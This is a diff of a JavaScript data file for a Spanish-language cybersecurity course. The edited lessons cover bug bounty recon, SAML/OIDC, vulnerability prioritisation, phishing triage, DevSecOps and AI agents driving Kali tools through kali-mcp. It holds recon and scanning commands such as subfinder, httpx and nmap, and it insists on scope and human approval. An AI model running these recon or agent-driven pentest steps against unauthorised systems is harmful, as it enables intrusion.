-    "theory": "Ejecutar una campaña de bug bounty ética y estructurada: elegir un programa, leer y respetar su alcance, hacer reconocimiento eficiente, priorizar vectores de alto impacto, validar hallazgos con PoC reproducibles y redactar reportes aceptables que maximicen la probabilidad de triage positivo. Integra la Parte 6 (web/OWASP), la Parte 7 (recon) y la Parte 3 (redes), aplicándolas al mundo real dentro de un marco legal. > ⚠️ Ética y legalidad: solo actúa dentro del alcance (scope) de un programa que te autoriza explícitamente. Probar fuera de alcance, exfiltrar datos reales o pivotar sin permiso…",
+    "theory": "Ejecutar una campaña de bug bounty ética y estructurada: elegir un programa, leer y respetar su alcance, hacer reconocimiento eficiente, priorizar vectores de alto impacto, validar hallazgos con PoC reproducibles y redactar reportes aceptables que maximicen la probabilidad de triage positivo. Integra la Parte 6 (web/OWASP), la Parte 7 (recon) y la Parte 3 (redes), aplicándolas al mundo real dentro de un marco legal. ⚠️ Ética y legalidad: solo actúa dentro del alcance (scope) de un programa que te autoriza explícitamente. Probar fuera de alcance, exfiltrar datos reales o pivotar sin permiso es…",
     "outcomes": [
       "Seleccionar un programa y comprender su alcance y reglas.",
       "Automatizar un flujo de reconocimiento respetuoso con el scope.",
@@ -15994,7 +15994,7 @@ export const CLASSES = [
       "Notas y capturas para el reporte; plantilla de reporte con secciones estándar.",
       "Un laboratorio propio (PortSwigger Web Security Academy) para practicar técnicas antes de ir al programa real."
     ],
-    "lab": "> Practica las técnicas en PortSwigger Academy o tu laboratorio; aplícalas en un programa solo dentro de su scope. 1. Elige programa y lee el scope. Anota activos en scope, exclusiones, tipos de bug aceptados y el safe harbor. 2. Reconocimiento pasivo. Enumera subdominios con subfinder/amass y resuélvelos con httpx (respetando scope): ``bash subfinder -d ejemplo-en-scope.com -silent | httpx -sile…",
+    "lab": "Practica las técnicas en PortSwigger Academy o tu laboratorio; aplícalas en un programa solo dentro de su scope. 1. Elige programa y lee el scope. Anota activos en scope, exclusiones, tipos de bug aceptados y el safe harbor. 2. Reconocimiento pasivo. Enumera subdominios con subfinder/amass y resuélvelos con httpx (respetando scope): ``bash subfinder -d ejemplo-en-scope.com -silent | httpx -silent…",
     "exercises": [
       "Resume el scope de un programa real en una tabla (in/out, tipos aceptados).",
       "Ejecuta un flujo de recon y lista 10 activos en scope.",
@@ -16015,7 +16015,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "120 min",
     "description": "Convertir el trabajo de las 308 clases anteriores en evidencia empleable: un portafolio público (writeups, informes anonimizados, repos) y un home lab permanente y reproducible donde seguir practicando.",
-    "theory": "Convertir el trabajo de las 308 clases anteriores en evidencia empleable: un portafolio público (writeups, informes anonimizados, repos) y un home lab permanente y reproducible donde seguir practicando. El objetivo es que un reclutador o cliente pueda, en cinco minutos, verificar tu competencia real. Integra los entregables de los capstones (Clases 303, 305, 306, 307, 308) en una vitrina profesional. > ⚠️ Ética: al publicar, anonimiza cualquier dato de sistemas reales o de programas de bug bounty (respeta sus políticas de divulgación). Nunca publiques credenciales, PII ni detalles fuera de sc…",
+    "theory": "Convertir el trabajo de las 308 clases anteriores en evidencia empleable: un portafolio público (writeups, informes anonimizados, repos) y un home lab permanente y reproducible donde seguir practicando. El objetivo es que un reclutador o cliente pueda, en cinco minutos, verificar tu competencia real. Integra los entregables de los capstones (Clases 303, 305, 306, 307, 308) en una vitrina profesional. ⚠️ Ética: al publicar, anonimiza cualquier dato de sistemas reales o de programas de bug bounty (respeta sus políticas de divulgación). Nunca publiques credenciales, PII ni detalles fuera de scop…",
     "outcomes": [
       "Estructurar un portafolio con proyectos, writeups e informes.",
       "Publicar contenido técnico anonimizado y bien presentado.",
@@ -16321,7 +16321,7 @@ export const CLASSES = [
       "Un analizador de tráfico del navegador (DevTools → Network) para observar redirecciones,",
       "Especificaciones de referencia: SAML 2.0 Core (OASIS) y OpenID Connect Core 1.0."
     ],
-    "lab": "> Ejercicio de arquitectura y observación; trabaja solo con tu IdP y apps de prueba. 1. Mapa de actores. Para \"NovaSalud\", identifica el IdP corporativo y 2 SP/RP (un portal web interno vía SAML y una app móvil vía OIDC). Dibuja quién confía en quién. 2. Flujo SAML SP-initiated. Traza los pasos: (1) usuario accede al SP → (2) SP redirige al IdP con un SAMLRequest → (3) IdP autentica → (4) IdP dev…",
+    "lab": "Ejercicio de arquitectura y observación; trabaja solo con tu IdP y apps de prueba. 1. Mapa de actores. Para \"NovaSalud\", identifica el IdP corporativo y 2 SP/RP (un portal web interno vía SAML y una app móvil vía OIDC). Dibuja quién confía en quién. 2. Flujo SAML SP-initiated. Traza los pasos: (1) usuario accede al SP → (2) SP redirige al IdP con un SAMLRequest → (3) IdP autentica → (4) IdP devue…",
     "exercises": [
       "Explica con tus palabras por qué OAuth 2.0 solo no debe usarse para \"iniciar sesión\".",
       "Ordena correctamente los pasos desordenados de un flujo SAML SP-initiated.",
@@ -16544,7 +16544,7 @@ export const CLASSES = [
       "Hoja de cálculo o script Python para cruzar CVE × CVSS × EPSS × KEV y ordenar por riesgo.",
       "Gestor de tickets (Jira, GitHub Issues) para simular el flujo de remediación."
     ],
-    "lab": "Ejercicio aplicado: escanearás un objetivo de laboratorio y construirás una cola de remediación priorizada por riesgo con SLAs. 1. Inventaría el objetivo. En la red host-only, identifica el activo (Metasploitable) y clasifícalo por criticidad de negocio (aquí: bajo, es lab). 2. Escaneo no autenticado. Lanza Greenbone/OpenVAS contra el objetivo. Guarda el reporte (lista de CVEs con CVSS). 3. Escan…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — practica allí la priorización por exposición real y la sección de cobertura del informe. Ejercicio aplicado: escanearás un objetivo de laboratorio y construirás una cola de remediación priorizada por riesgo con SLAs. 1. Inventaría el objetivo. En la red host-only, identifica el activo (Metasploitable) y clasifícalo por criticidad de nego…",
     "exercises": [
       "Dada una lista de 5 CVEs con su CVSS y EPSS, ordénalas por riesgo y justifica por qué EPSS puede subir o bajar la prioridad frente a CVSS solo.",
       "Explica por qué una CVE con CVSS 6.5 en KEV puede ser más urgente que una CVSS 9.8 que no lo está.",
@@ -16565,7 +16565,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Analizar correos sospechosos como lo hace un analista SOC: leer cabeceras, verificar autenticación SPF/DKIM/DMARC, examinar URLs y adjuntos de forma segura, hacer triaje por indicadores y ejecutar la respuesta (contenci…",
-    "theory": "Analizar correos sospechosos como lo hace un analista SOC: leer cabeceras, verificar autenticación SPF/DKIM/DMARC, examinar URLs y adjuntos de forma segura, hacer triaje por indicadores y ejecutar la respuesta (contención, purga, bloqueo, reporte). Es una clase defensiva alineada con el módulo de Phishing Analysis de BTL1 y el dominio de amenazas de Security+. > ⚠️ Ética y seguridad: todo análisis de adjuntos/URLs maliciosos se hace en una VM aislada, sin red o con red controlada, sobre muestras propias o de laboratorios autorizados. Nunca abras un adjunto sospechoso en tu equipo de trabajo n…",
+    "theory": "Analizar correos sospechosos como lo hace un analista SOC: leer cabeceras, verificar autenticación SPF/DKIM/DMARC, examinar URLs y adjuntos de forma segura, hacer triaje por indicadores y ejecutar la respuesta (contención, purga, bloqueo, reporte). Es una clase defensiva alineada con el módulo de Phishing Analysis de BTL1 y el dominio de amenazas de Security+. ⚠️ Ética y seguridad: todo análisis de adjuntos/URLs maliciosos se hace en una VM aislada, sin red o con red controlada, sobre muestras propias o de laboratorios autorizados. Nunca abras un adjunto sospechoso en tu equipo de trabajo ni…",
     "outcomes": [
       "Leer cabeceras de correo (Received, Return-Path, Authentication-Results, Message-ID) para reconstruir la ruta y detectar suplantación.",
       "Interpretar los resultados de SPF, DKIM y DMARC y explicar por qué un mensaje puede \"pasar\" SPF pero seguir siendo phishing.",
@@ -17219,7 +17219,7 @@ export const CLASSES = [
       "CI: repositorio con GitHub Actions (o GitLab CI) para orquestar los análisis en cada PR.",
       "Scripting: Python o Bash para lanzar herramientas, parsear JSON/SARIF y generar el informe."
     ],
-    "lab": "Ejercicio aplicado: revisas código manualmente, montas análisis automatizado en CI, triras los hallazgos y automatizas el informe. 1. Revisión manual. Toma un endpoint vulnerable (p. ej. una consulta SQL construida por concatenación) y, con el checklist de OWASP Code Review / ASVS, identifica el fallo, su categoría (inyección) y la corrección (consulta parametrizada). Documenta el antes/después.…",
+    "lab": "🧪 Laboratorio ejecutable del programa: devsecops-pipeline — su script auditar.sh orquesta las ocho capas y distingue siempre sin hallazgos de no ejecutada, y priorizar.py implementa la priorización KEV → EPSS → CVSS contra las APIs reales. Ejercicio aplicado: revisas código manualmente, montas análisis automatizado en CI, triras los hallazgos y automatizas el informe. 1. Revisión manual. Toma un…",
     "exercises": [
       "Revisa un fragmento con concatenación SQL y reescríbelo con consulta parametrizada; nombra la regla ASVS aplicable.",
       "Construye una tabla que compare SAST/DAST/IAST/SCA por: qué ven, cuándo corren, falsos positivos y falsos negativos típicos.",
@@ -17240,7 +17240,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "90 min",
     "description": "Entender qué son los modelos generativos de lenguaje (LLM) y qué papel real juegan como herramienta de trabajo para hacer ciberseguridad: dónde aportan valor (acelerar tareas repetitivas, sintetizar información, redacta…",
-    "theory": "Entender qué son los modelos generativos de lenguaje (LLM) y qué papel real juegan como herramienta de trabajo para hacer ciberseguridad: dónde aportan valor (acelerar tareas repetitivas, sintetizar información, redactar) y dónde fallan (alucinaciones, falta de contexto, datos desactualizados). Al terminar sabrás decidir cuándo apoyarte en un LLM y cuándo NO confiar en su salida sin verificación humana. > Importante: esta parte trata de usar IA para HACER seguridad (ofensiva y defensiva). No la confundas con la Parte 15, que trata de proteger a la propia IA (seguridad DE los modelos: prompt i…",
+    "theory": "Entender qué son los modelos generativos de lenguaje (LLM) y qué papel real juegan como herramienta de trabajo para hacer ciberseguridad: dónde aportan valor (acelerar tareas repetitivas, sintetizar información, redactar) y dónde fallan (alucinaciones, falta de contexto, datos desactualizados). Al terminar sabrás decidir cuándo apoyarte en un LLM y cuándo NO confiar en su salida sin verificación humana. Importante: esta parte trata de usar IA para HACER seguridad (ofensiva y defensiva). No la confundas con la Parte 15, que trata de proteger a la propia IA (seguridad DE los modelos: prompt inj…",
     "outcomes": [
       "Explicar en términos operativos cómo un LLM genera texto y por qué eso condiciona su fiabilidad.",
       "Clasificar tareas de ciberseguridad según si un LLM aporta valor alto, medio o nulo.",
@@ -17331,7 +17331,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Montar y entender kali-mcp, un servidor MCP (de código abierto, MIT) que conecta un agente de IA con más de 50 herramientas de Kali Linux dentro de un contenedor Docker.",
-    "theory": "Montar y entender kali-mcp, un servidor MCP (de código abierto, MIT) que conecta un agente de IA con más de 50 herramientas de Kali Linux dentro de un contenedor Docker. Verás su arquitectura y el flujo de trabajo /kali-start → /kali-pentest → /kali-finish, siempre con supervisión humana y contra un objetivo autorizado de tu laboratorio. > Esta clase explica y referencia kali-mcp con atribución a su autor; el contenido aquí es > original. Consulta el repositorio oficial para la documentación y los comandos exactos.",
+    "theory": "Montar y entender kali-mcp, un servidor MCP (de código abierto, MIT) que conecta un agente de IA con más de 50 herramientas de Kali Linux dentro de un contenedor Docker. Verás su arquitectura y el flujo de trabajo /kali-start → /kali-pentest → /kali-finish, siempre con supervisión humana y contra un objetivo autorizado de tu laboratorio. Esta clase explica y referencia kali-mcp con atribución a su autor; el contenido aquí es original. Consulta el repositorio oficial para la documentación y los comandos exactos.",
     "outcomes": [
       "Describir la arquitectura de kali-mcp: agente ↔ gateway MCP ↔ contenedor Kali.",
       "Instalar kali-mcp en un laboratorio propio con Docker.",
@@ -17353,7 +17353,7 @@ export const CLASSES = [
       "Un objetivo autorizado propio: una VM vulnerable de tu laboratorio (p. ej. el",
       "Sigue las instrucciones oficiales del repositorio para la instalación exacta."
     ],
-    "lab": "> Todo contra un objetivo tuyo en una red aislada. Nunca contra Internet. 1. Clonar e inicializar (según el README oficial del proyecto): ``bash git clone https://github.com/pabpereza/kali-mcp.git cd kali-mcp ./init.sh # levanta el contenedor Kali y el gateway MCP ` 2. Conectar el agente. Configura tu cliente de IA para usar el servidor MCP de kali-mcp (archivo de configuración .mcp.json` del pro…",
+    "lab": "Todo contra un objetivo tuyo en una red aislada. Nunca contra Internet. 1. Clonar e inicializar (según el README oficial del proyecto): ``bash git clone https://github.com/pabpereza/kali-mcp.git cd kali-mcp ./init.sh # levanta el contenedor Kali y el gateway MCP ` 2. Conectar el agente. Configura tu cliente de IA para usar el servidor MCP de kali-mcp (archivo de configuración .mcp.json` del proye…",
     "exercises": [
       "Dibuja la arquitectura de kali-mcp e indica dónde está el aislamiento.",
       "¿Por qué es importante que las herramientas corran en un contenedor y no en tu host?",
@@ -17390,7 +17390,7 @@ export const CLASSES = [
     ],
     "definitions": [],
     "tools": [],
-    "lab": "> Contra tu VM de laboratorio, dentro del alcance declarado. 1. Recon pasivo. Pide al agente un resumen de la información pública del objetivo (en el lab, será mínima). Observa qué infiere y qué inventa. 2. Descubrimiento de hosts/puertos. Ejecuta el flujo de escaneo y revisa la lista de puertos/servicios propuesta. 3. Validación. Elige 3 hallazgos y confírmalos manualmente en la terminal (nmap -…",
+    "lab": "Contra tu VM de laboratorio, dentro del alcance declarado. 1. Recon pasivo. Pide al agente un resumen de la información pública del objetivo (en el lab, será mínima). Observa qué infiere y qué inventa. 2. Descubrimiento de hosts/puertos. Ejecuta el flujo de escaneo y revisa la lista de puertos/servicios propuesta. 3. Validación. Elige 3 hallazgos y confírmalos manualmente en la terminal (nmap -sV…",
     "exercises": [
       "Diferencia recon pasivo y activo con un ejemplo de cada uno.",
       "¿Qué riesgo hay si el agente \"asume\" una versión de servicio que no verificó?",
@@ -17427,7 +17427,7 @@ export const CLASSES = [
     ],
     "definitions": [],
     "tools": [],
-    "lab": "> Solo contra tu VM, con un alcance escrito que tú mismo definas para el ejercicio. 1. Priorización de vectores. Pide al agente que, a partir del recon, priorice posibles vías de entrada sin ejecutarlas. Revisa su razonamiento. 2. Decisión humana. Elige tú un vector de PoC de bajo impacto y apruébalo explícitamente. 3. Ejecución supervisada. Ejecuta la PoC (p. ej. demostrar acceso con un comando…",
+    "lab": "Solo contra tu VM, con un alcance escrito que tú mismo definas para el ejercicio. 1. Priorización de vectores. Pide al agente que, a partir del recon, priorice posibles vías de entrada sin ejecutarlas. Revisa su razonamiento. 2. Decisión humana. Elige tú un vector de PoC de bajo impacto y apruébalo explícitamente. 3. Ejecución supervisada. Ejecuta la PoC (p. ej. demostrar acceso con un comando in…",
     "exercises": [
       "¿Por qué la decisión de explotar no debe delegarse en la IA?",
       "Define 3 acciones que siempre requieren aprobación humana.",
